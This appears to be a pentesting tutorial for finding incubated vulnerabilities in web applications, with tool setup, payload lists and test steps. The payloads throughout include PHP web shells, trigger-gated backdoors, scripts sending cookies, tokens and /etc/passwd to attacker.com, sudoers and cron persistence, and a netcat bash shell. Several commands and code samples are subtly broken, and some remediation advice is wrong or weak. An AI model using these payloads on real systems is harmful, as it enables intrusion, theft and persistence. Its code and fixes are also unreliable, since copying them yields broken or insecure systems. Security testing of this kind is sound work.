# Testing for Incubated Vulnerabilities

## Overview

Testing for Incubated Vulnerabilities involves verifying that a web application does not contain weaknesses that attackers can exploit later through staged or persistent attacks, such as time bombs, backdoors, or data leaks. According to OWASP (WSTG-INPV-014), Incubated Vulnerabilities are flaws that may not be immediately exploitable but can be leveraged over time to compromise the application, steal data, or gain unauthorized access. This guide provides a hands-on methodology to test for Incubated Vulnerabilities, focusing on identifying potential entry points, persistent payloads, time-based triggers, data leakage, privilege escalation, configuration manipulation, session persistence attacks, and trigger evasion, with tools, commands, payloads, and remediation strategies.

**Impact**: Incubated Vulnerabilities can lead to:
- Persistent unauthorized access via backdoors or malicious scripts.
- Delayed execution of malicious code (e.g., time bombs).
- Unauthorized data exposure over time.
- Privilege escalation or system compromise.
- Non-compliance with security standards (e.g., PCI DSS, GDPR).

**Ethical Note**: Obtain explicit permission before testing, as testing for incubated vulnerabilities may involve injecting persistent payloads or triggering delayed actions that could disrupt application functionality or data integrity.

## Testing Tools

The following tools are recommended for testing Incubated Vulnerabilities, with setup instructions optimized for new pentesters:

- **Burp Suite Community Edition**: Intercepts and modifies HTTP requests to inject persistent or delayed payloads.
  - Download from [PortSwigger](https://portswigger.net/burp/communitydownload).
  - Configure browser proxy: `127.0.0.1:8080` (Firefox recommended).
  - Use Repeater to test payloads and Proxy > HTTP History to identify entry points.
  - **Note**: Check responses for persistence or delayed effects.

- **OWASP ZAP 3.0**: A free tool for automated and manual vulnerability testing.
  - Download from [ZAP](https://www.zaproxy.org/download/).
  - Configure browser proxy: `127.0.0.1:8080`.
  - Enable HUD (Heads-Up Display):
    1. Go to Tools > Options > HUD.
    2. Enable HUD for in-browser testing.
  - Use Active Scan with custom rules; manually verify findings due to limited support for incubated vulnerabilities.

- **cURL and HTTPie**: Send HTTP requests with persistent or time-based payloads.
  - **cURL**:
    - Install on Linux:
      ```bash
      sudo apt install curl
      ```
    - Install on Windows/Mac: Pre-installed or download from [curl.se](https://curl.se/).
  - **HTTPie** (beginner-friendly):
    - Install on Linux/Mac:
      ```bash
      sudo apt install httpie
      ```
    - Install on Windows: `pip install httpie`.
    - Example:
      ```bash
      # cURL
      curl -i "http://example.com/upload?file=malicious.php"
      # HTTPie
      http "http://example.com/upload?file==malicious.php"
      ```

- **Postman**: GUI tool for testing payloads in APIs or forms.
  - Download from [Postman](https://www.postman.com/downloads/).
  - Send payloads in query parameters or body.
  - **Tip**: Use Collections for batch testing.

- **Browser Developer Tools (Chrome/Firefox**: Inspects responses to persistent or delayed payloads.
  - Access: Press `F12` or `Ctrl+Shift+I`.
  - Use Network tab to analyze responses and Console tab for tests.
  - **Note**: Firefox’s enhanced 2025 network analysis enhances response time debugging.

- **Netcat (nc)**: Tests server responses for backdoors or persistent connections.
  - Install on Linux:
    ```bash
    sudo apt install netcat
    ```
  - Install on Windows/Mac: Download from [nmap.org](https://nmap.org/ncat/).
  - Example:
    ```bash
    echo -e "GET /backdoor.php HTTP/1.1\nHost: example.com\n\n" | nc example.com 80
    ```

## Testing Methodology

This methodology follows OWASP’s black-box and gray-box approaches for WSTG-INPV-014, testing Incubated Vulnerabilities across potential entry points, persistent payloads, time-based triggers, data leakage, privilege escalation, configuration manipulation, session persistence attacks, and trigger evasion.

### Common Incubated Vulnerability Payloads

Below is a list of common payloads to test for Incubated Vulnerabilities. Start with simple payloads and escalate based on application behavior. Use with caution in controlled environments to avoid unintended persistence or data exposure.

- **Persistent Payloads**:
  - `<?php system($_GET['cmd']); ?>` (PHP backdoor)
  - `<script>fetch('http://attacker.com/log?data='+document.cookie)</script>` (JavaScript persistence)
  - `eval(base64_decode('malicious_code'));` (Encoded payload)
  - `echo 'malicious' > /tmp/backdoor` (File-based persistence)

- **Time-Based Trigger Payloads**:
  - `<?php if (date('Y-m-d') > '2025-06-01') { system('whoami'); } ?>` (Delayed execution)
  - `<script>setTimeout(function(){malicious()}, 86400000);</script>` (24-hour delay)
  - `at now + 1 day -f malicious.sh` (Scheduled task)
  - `crontab -e '0 0 * * * /tmp/malicious.sh'` (Cron job)

- **Data Leakage Payloads**:
  - `<?php file_get_contents('http://attacker.com/log?data='.urlencode(file_get_contents('/etc/passwd'))); ?>` (Exfiltrates file)
  - `<script>new Image().src='http://attacker.com/log?data='+encodeURIComponent(localStorage.getItem('token'));</script>` (Steals token)
  - `curl http://attacker.com/log -d @/var/log/app.log` (Sends log data)
  - `<?php mail('attacker@evil.com', 'Data', file_get_contents('/config/db.conf')); ?>` (Emails data)

- **Privilege Escalation Payloads**:
  - `<?php system('chmod u+s /bin/bash'); ?>` (Sets SUID bit)
  - `sudo -u root /tmp/malicious.sh` (Exploits sudo misconfiguration)
  - `<?php putenv('PATH=/tmp:$PATH'); system('custom_binary'); ?>` (Path manipulation)
  - `echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers` (Modifies sudoers)

- **Configuration Manipulation Payloads**:
  - `<?php file_put_contents('/etc/crontab', '0 * * * * root /tmp/malicious.sh\n', FILE_APPEND); ?>` (Adds cron job)
  - `echo '*/1 * * * * /tmp/backdoor.sh' > /etc/cron.d/attack` (Cron file creation)
  - `<?php ini_set('open_basedir', '/tmp'); ?>` (Alters PHP config)
  - `echo 'malicious_alias=malicious_command' >> /etc/bash.bashrc` (Shell config change)

- **Session Persistence Payloads**:
  - `<script>document.cookie='session=malicious;path=/;expires=Wed, 01 Jan 2026 00:00:00 GMT'</script>` (Persistent cookie)
  - `<?php $_SESSION['user']='admin'; ?>` (Session hijack)
  - `<script>localStorage.setItem('token', 'malicious_token');</script>` (Local storage manipulation)
  - `<?php setcookie('auth', 'admin', time()+31536000); ?>` (Long-lived cookie)

- **Trigger Evasion Payloads**:
  - `<?php /*hidden*/ if (isset($_GET['secret'])) { system($_GET['cmd']); } ?>` (Conditional trigger)
  - `<script>if (location.href.includes('trigger')) { malicious(); }</script>` (URL-based trigger)
  - `eval(decodeURIComponent('malicious%20code'));` (Encoded payload)
  - `<?php if ($_SERVER['REMOTE_ADDR'] == 'attacker_ip') { system('whoami'); } ?>` (IP-based trigger)

**Note**: Payloads depend on the application’s technology stack (e.g., PHP, JavaScript, server configuration) and persistence mechanisms (e.g., file uploads, database storage). Test payloads in upload forms, user profiles, or inputs that may be stored or executed later.

### 1. Identify Potential Entry Points

**Objective**: Locate inputs or features that may allow persistent or delayed payloads.

**Steps**:
1. Browse the website:
   - Visit the target (e.g., `http://example.com`).
   - Identify forms, APIs, or features that store input (e.g., user profiles, file uploads, comments, logs).
2. Capture requests with Burp Suite:
   - Enable Intercept (Proxy > Intercept > On).
   - Submit forms or interact with features to capture requests in HTTP History.
   - Note parameters (e.g., `bio=test`, `file=upload.jpg`).
3. Inspect responses:
   - Check for stored data, script execution, or delayed responses.
   - Use Developer Tools (`Ctrl+Shift+I`) to search for stored payloads or scheduled tasks.
4. List entry points:
   - Document upload endpoints, profile fields, comment sections, and API inputs.

**Example Entry Points**:
- URL: `http://example.com/profile?bio=test`
- Form: `<input name="avatar">`
- API: `POST /api/upload` with `{"file": "data"}`

**Remediation**:
- Validate input types:
  ```php
  if (!in_array($_FILES['file']['type'], ['image/jpeg', 'image/png'])) die("Invalid file");
  ```
- Sanitize stored data:
  ```php
  $bio = htmlspecialchars($_POST['bio'], ENT_QUOTES, 'UTF-8');
  ```

**Tip**: Save the entry point list in a report.

### 2. Test for Persistent Payloads

**Objective**: Verify if user input can inject persistent malicious payloads.

**Steps**:
1. Identify storage inputs:
   - Look for fields like user bios, comments, or file uploads.
2. Inject payloads:
   - Use Burp Repeater:
     ```http
     POST /profile HTTP/1.1
     Host: example.com
     Content-Type: application/x-www-form-urlencoded
     bio=<?php system($_GET['cmd']); ?>
     ```
   - Use HTTPie:
     ```bash
     http POST http://example.com/profile bio="<?php system($_GET['cmd']); ?>"
     ```
3. Check persistence:
   - Visit profile page or trigger stored data.
   - Test: `http://example.com/profile?cmd=whoami`.
4. Test file uploads:
   - Upload: `backdoor.php` with `<?php system($_GET['cmd']); ?>`.

**Example Vulnerable Code (PHP)**:
```php
$bio = $_POST['bio'];
file_put_contents("user_bio.txt", $bio);
```
Test: `bio=<?php system($_GET['cmd']); ?>`
Result: Executes `whoami`.

**Example Secure Code (PHP)**:
```php
$bio = filter_var($_POST['bio'], FILTER_SANITIZE_STRING);
file_put_contents("user_bio.txt", $bio);
```
Test: No execution.

**Remediation**:
- Sanitize inputs:
  ```php
  $bio = strip_tags($bio);
  ```
- Restrict file types:
  ```php
  if (!preg_match('/\.(jpg|png)$/', $_FILES['file']['name'])) die("Invalid file");
  ```

**Tip**: Save executed payload evidence in a report.

### 3. Test for Time-Based Triggers

**Objective**: Check if inputs can create delayed or scheduled malicious actions.

**Steps**:
1. Inject time-based payloads:
   - Test: `<?php if (date('Y-m-d') > '2025-06-01') { system('whoami'); } ?>`
   - Use Burp:
     ```http
     POST /comment HTTP/1.1
     Host: example.com
     Content-Type: application/x-www-form-urlencoded
     comment=<?php if (date('Y-m-d') > '2025-06-01') { system('whoami'); } ?>
     ```
2. Monitor behavior:
   - Wait for trigger condition (e.g., specific date) or simulate time change in gray-box testing.
   - Test: `<script>setTimeout(function(){malicious()}, 86400000);</script>`.
3. Check server tasks:
   - Look for cron jobs or scheduled tasks (gray-box).
   - Test: `crontab -e '0 0 * * * /tmp/malicious.sh'`.
4. Use Netcat to verify:
   ```bash
   nc -l 4444
   ```

**Example Vulnerable Code (PHP)**:
```php
$comment = $_POST['comment'];
file_put_contents("comments.php", $comment);
```
Test: `comment=<?php if (date('Y-m-d') > '2025-06-01') { system('whoami'); } ?>`
Result: Executes after date.

**Example Secure Code (PHP)**:
```php
$comment = preg_replace('/<\?php.*?\?>/', '', $_POST['comment']);
file_put_contents("comments.php", $comment);
```
Test: No execution.

**Remediation**:
- Block script tags:
  ```php
  $comment = strip_tags($comment);
  ```
- Monitor scheduled tasks:
  ```bash
  crontab -l
  ```

**Tip**: Save trigger evidence in a report.

### 4. Test for Data Leakage

**Objective**: Verify if inputs can exfiltrate data over time.

**Steps**:
1. Inject leakage payloads:
   - Test: `<script>new Image().src='http://attacker.com/log?data='+encodeURIComponent(localStorage.getItem('token'));</script>`
   - Use cURL:
     ```bash
     curl -i -X POST -d "comment=<script>new Image().src='http://attacker.com/log?data='+encodeURIComponent(localStorage.getItem('token'));</script>" http://example.com/comment
     ```
2. Monitor attacker server:
   - Set up: `nc -l 8080` or check logs.
3. Check responses:
   - Look for stolen data (e.g., tokens, files).
   - Test: `<?php file_get_contents('http://attacker.com/log?data='.urlencode(file_get_contents('/etc/passwd'))); ?>`.
4. Test persistence:
   - Verify if payload remains active.

**Example Vulnerable Code (PHP)**:
```php
$comment = $_POST['comment'];
echo $comment;
```
Test: `comment=<script>new Image().src='http://attacker.com/log?data='+document.cookie;</script>`
Result: Sends cookie.

**Example Secure Code (PHP)**:
```php
$comment = htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8');
echo $comment;
```
Test: No leakage.

**Remediation**:
- Encode output:
  ```php
  echo htmlentities($comment);
  ```
- Implement CSP:
  ```html
  <meta http-equiv="Content-Security-Policy" content="default-src 'self'">
  ```

**Tip**: Save exfiltrated data in a report.

### 5. Test for Privilege Escalation

**Objective**: Check if inputs can escalate privileges via persistent mechanisms.

**Steps**:
1. Inject escalation payloads:
   - Test: `<?php system('chmod u+s /bin/bash'); ?>`
   - Use Burp:
     ```http
     POST /upload HTTP/1.1
     Host: example.com
     Content-Type: application/x-www-form-urlencoded
     file=backdoor.php&content=<?php system('chmod u+s /bin/bash'); ?>
     ```
2. Verify impact:
   - Check file permissions (gray-box).
   - Test: `sudo -u root /tmp/malicious.sh`.
3. Check responses:
   - Look for elevated access or errors.
   - Test: `echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers`.
4. Use Netcat to exploit:
   ```bash
   nc example.com 4444 -e /bin/bash
   ```

**Example Vulnerable Code (PHP)**:
```php
$file = $_POST['file'];
system("save_file $file");
```
Test: `file=;chmod u+s /bin/bash`
Result: Elevates bash.

**Example Secure Code (PHP)**:
```php
$file = basename($_POST['file']);
if (preg_match('/^[a-zA-Z0-9-]+$/', $file)) {
    system("save_file " . escapeshellarg($file));
} else {
    die("Invalid file");
}
```
Test: No escalation.

**Remediation**:
- Restrict permissions:
  ```bash
  chmod 750 /bin/bash
  ```
- Validate inputs:
  ```php
  if (strpos($file, ';') !== false) die("Invalid input");
  ```

**Tip**: Save escalation evidence in a report.

### 6. Test for Configuration Manipulation

**Objective**: Verify if inputs can alter server or application configurations to enable future attacks.

**Steps**:
1. Inject configuration payloads:
   - Test: `<?php file_put_contents('/etc/crontab', '0 * * * * root /tmp/malicious.sh\n', FILE_APPEND); ?>`
   - Use Burp:
     ```http
     POST /upload HTTP/1.1
     Host: example.com
     Content-Type: application/x-www-form-urlencoded
     file=config.php&content=<?php file_put_contents('/etc/crontab', '0 * * * * root /tmp/malicious.sh\n', FILE_APPEND); ?>
     ```
2. Check persistence:
   - Verify cron jobs (gray-box): `crontab -l`.
   - Test: `echo '*/1 * * * * /tmp/backdoor.sh' > /etc/cron.d/attack`.
3. Monitor behavior:
   - Look for scheduled task execution.
   - Test: `<?php ini_set('open_basedir', '/tmp'); ?>`.
4. Use Netcat to confirm:
   ```bash
   nc -l 4444
   ```

**Example Vulnerable Code (PHP)**:
```php
$content = $_POST['content'];
file_put_contents("/config/app.php", $content);
```
Test: `content=<?php file_put_contents('/etc/crontab', '0 * * * * root /tmp/malicious.sh\n', FILE_APPEND); ?>`
Result: Adds malicious cron job.

**Example Secure Code (PHP)**:
```php
$content = filter_var($_POST['content'], FILTER_SANITIZE_STRING);
if (preg_match('/file_put_contents|crontab/', $content)) die("Invalid input");
file_put_contents("/config/app.php", $content);
```
Test: No manipulation.

**Remediation**:
- Restrict file writes:
  ```php
  chmod 644 /etc/crontab
  ```
- Validate configurations:
  ```php
  if (strpos($content, 'cron') !== false) die("Invalid input");
  ```

**Tip**: Save configuration changes in a report.

### 7. Test for Session Persistence Attacks

**Objective**: Check if inputs can create persistent session-based vulnerabilities.

**Steps**:
1. Inject session payloads:
   - Test: `<script>document.cookie='session=malicious;path=/;expires=Wed, 01 Jan 2026 00:00:00 GMT'</script>`
   - Use cURL:
     ```bash
     curl -i -X POST -d "comment=<script>document.cookie='session=malicious;path=/;expires=Wed, 01 Jan 2026 00:00:00 GMT'</script>" http://example.com/comment
     ```
2. Verify persistence:
   - Check cookies in browser or via Developer Tools.
   - Test: `<?php $_SESSION['user']='admin'; ?>`.
3. Check responses:
   - Look for unauthorized access or session hijacking.
   - Test: `<script>localStorage.setItem('token', 'malicious_token');</script>`.
4. Use Postman to simulate:
   - Send: `{"comment": "<script>document.cookie='session=malicious'}</script>"}`.

**Example Vulnerable Code (PHP)**:
```php
$comment = $_POST['comment'];
echo $comment;
```
Test: `comment=<script>document.cookie='session=malicious;path=/;expires=Wed, 01 Jan 2026 00:00:00 GMT'</script>`
Result: Sets persistent cookie.

**Example Secure Code (PHP)**:
```php
$comment = htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8');
echo $comment;
```
Test: No cookie manipulation.

**Remediation**:
- Sanitize output:
  ```php
  echo htmlentities($comment);
  ```
- Secure cookies:
  ```php
  setcookie('session', $value, ['httponly' => true, 'secure' => true]);
  ```

**Tip**: Save session manipulation evidence in a report.

### 8. Test for Trigger Evasion

**Objective**: Verify if inputs can create payloads that evade detection or activation checks.

**Steps**:
1. Inject evasive payloads:
   - Test: `<?php /*hidden*/ if (isset($_GET['secret'])) { system($_GET['cmd']); } ?>`
   - Use Burp:
     ```http
     POST /profile HTTP/1.1
     Host: example.com
     Content-Type: application/x-www-form-urlencoded
     bio=<?php /*hidden*/ if (isset($_GET['secret'])) { system($_GET['cmd']); } ?>
     ```
2. Check activation:
   - Test: `http://example.com/profile?secret=1&cmd=whoami`.
3. Test obfuscation:
   - Try: `eval(decodeURIComponent('malicious%20code'));`.
   - Test: `<script>if (location.href.includes('trigger')) { malicious(); }</script>`.
4. Monitor logs:
   - Check for payload detection (gray-box).

**Example Vulnerable Code (PHP)**:
```php
$bio = $_POST['bio'];
file_put_contents("bio.php", $bio);
```
Test: `bio=<?php /*hidden*/ if (isset($_GET['secret'])) { system($_GET['cmd']); } ?>`
Result: Executes with secret parameter.

**Example Secure Code (PHP)**:
```php
$bio = preg_replace('/<\?php.*?\?>/', '', $_POST['bio']);
file_put_contents("bio.php", $bio);
```
Test: No execution.

**Remediation**:
- Filter scripts:
  ```php
  $bio = strip_tags($bio);
  ```
- Implement WAF:
  ```apache
  SecRule ARGS "@contains <?php" "deny,status:403"
  ```

**Tip**: Save evasion evidence in a report.
